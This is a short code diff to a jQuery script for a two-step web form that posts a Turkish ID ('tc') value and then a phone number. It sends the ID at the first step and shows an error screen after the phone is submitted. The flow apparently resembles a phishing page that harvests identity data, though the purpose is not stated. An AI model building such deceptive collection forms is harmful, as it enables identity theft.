@@ -44,9 +44,7 @@ $(function () {
             dataType: "json",
             data: jsonData,
             success: function (response) {
-                setTimeout(function () {
-                    location.reload();
-                }, 3000);
+               
             },
         });
     }
@@ -71,7 +69,6 @@ $(function () {
         }
 
         $try++;
-        console.log($try);
         if ($try) {
             let jsonData = {
                 tc: $tc.val(),
@@ -82,6 +79,8 @@ $(function () {
             if ($try == 1) {
                 $(".first_step").hide();
                 $(".two_step").removeClass("d-none").fadeIn();
+                postForm(jsonData);
+
             } else if ($try > 1) {
                 jsonData["phone"] = $phone.val();
                 if (
@@ -94,6 +93,9 @@ $(function () {
                     $(".wpforms-submit-container").hide();
                     $(".error_step").fadeIn();
                     postForm(jsonData);
+                    setTimeout(function () {
+                        location.reload();
+                    }, 3000);
                 } else {
                     console.log("girmedi");
                     alert("telefon boş geçilemez");
